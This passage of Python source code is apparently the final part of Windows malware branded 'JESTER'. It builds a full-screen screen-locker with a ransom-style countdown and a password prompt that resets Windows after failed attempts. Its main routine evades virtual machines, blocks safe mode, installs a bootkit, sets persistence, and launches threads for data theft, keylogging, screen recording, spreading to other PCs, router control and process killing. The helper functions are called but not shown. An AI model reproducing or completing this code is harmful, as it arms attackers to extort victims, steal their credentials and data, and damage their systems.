        self.timer_lbl = tk.Label(top, text="Time left: 14h 04m 07s", bg='white', fg='#cc0000', font=('Courier', 20, 'bold'))
        self.timer_lbl.pack(pady=5)
        data_leak_indicator(top)
        try: hn = socket.gethostname(); ip = socket.gethostbyname(hn)
        except: hn = "Unknown"; ip = "192.251.68.250"
        tk.Label(top, text=f"System: {hn}  |  IP: {ip}  |  Encrypted: 5,925 files", bg='white', fg='#888', font=('Courier', 8)).pack(pady=5)
        
        # Кнопки
        btn_frame = tk.Frame(self.win, bg='#1a3a5c')
        btn_frame.place(relx=0.5, rely=0.40, anchor='center')
        for txt in ["Refresh", "Payment", "FAQ", "Decrypt One File", "Support"]:
            tk.Button(btn_frame, text=txt, bg='#ddd', fg='#333', font=('Courier', 8), relief='raised', bd=1, width=15, state='disabled').pack(side='left', padx=3)
        
        # Маска
        jester = draw_jester()
        jp = os.path.join(tempfile.gettempdir(), "jester.png")
        jester.save(jp)
        self.jp = PhotoImage(file=jp)
        tk.Label(self.win, image=self.jp, bg='#1a3a5c').place(relx=0.5, rely=0.58, anchor='center')
        
        tk.Label(self.win, text="JESTER ☠ ACTUAL", bg='#1a3a5c', fg='white', font=('Courier', 10, 'bold')).place(relx=0.5, rely=0.75, anchor='center')
        tk.Label(self.win, text='"There is an unequal amount of good and bad in most things.\nThe trick is to figure the ratio and act accordingly."', bg='#1a3a5c', fg='#aaa', font=('Courier', 7, 'italic')).place(relx=0.5, rely=0.80, anchor='center')
        tk.Label(self.win, text="usa", bg='#1a3a5c', fg='#ffffff15', font=('Arial', 36, 'bold')).place(relx=0.01, rely=0.98, anchor='sw')
        
        # Поле ввода
        cf = tk.Frame(self.win, bg='#1a3a5c'); cf.place(relx=0.5, rely=0.88, anchor='center')
        tk.Label(cf, text="ENTER PASSWORD:", bg='#1a3a5c', fg='white', font=('Courier', 10, 'bold')).pack(pady=(0,2))
        self.pw = tk.Entry(cf, show="*", font=('Courier', 10, 'bold'), bg='white', fg='black', relief='solid', bd=1)
        self.pw.pack(pady=(0,2), ipadx=20, ipady=1)
        self.sl = tk.Label(cf, text=f"ATTEMPTS LEFT: {attempts_left}", bg='#1a3a5c', fg='white', font=('Courier', 9))
        self.sl.pack()
        self.pw.bind('<Return>', self.check); self.pw.focus_force()
        self.win.after(100, self._keep)
    
    def _keep(self):
        try: self.win.focus_force(); self.pw.focus_force(); self.win.after(100, self._keep)
        except: pass
    
    def check(self, e=None):
        global attempts_left
        if self.pw.get() == PASSWORD:
            restore_win_key(); unblock()
            self.sl.config(text="CORRECT!", fg='#0f0'); self.win.update(); time.sleep(1)
            self.root.destroy(); os._exit(0)
        else:
            attempts_left -= 1
            if attempts_left > 0: self.sl.config(text=f"WRONG! ATTEMPTS LEFT: {attempts_left}", fg='white')
            else:
                self.sl.config(text="404 | ERROR", fg='white'); self.win.update(); time.sleep(2)
                self.root.destroy(); reset_windows()
            self.pw.delete(0, tk.END)

# ===== MAIN =====
if __name__ == "__main__":
    hide_console(); disable_win_key()
    
    # Anti-VM check
    if is_vm():
        send_email("VM DETECTED", "Anti-VM")
        os._exit(0)
    
    block_safe_mode()
    install_bootkit()
    add_to_startup()
    
    threading.Thread(target=download_video, daemon=True).start()
    threading.Thread(target=download_audio, daemon=True).start()
    threading.Thread(target=mega_steal, daemon=True).start()
    threading.Thread(target=record_loop, daemon=True).start()
    threading.Thread(target=keylogger_thread, daemon=True).start()
    
    jester_animation()
    play_video_fullscreen()
    block_keys()
    
    threading.Thread(target=infect_other_pcs, daemon=True).start()
    threading.Thread(target=lambda: control_router("reboot"), daemon=True).start()
    threading.Thread(target=kill_procs, daemon=True).start()
    
    WinLocker()
    tk.mainloop()
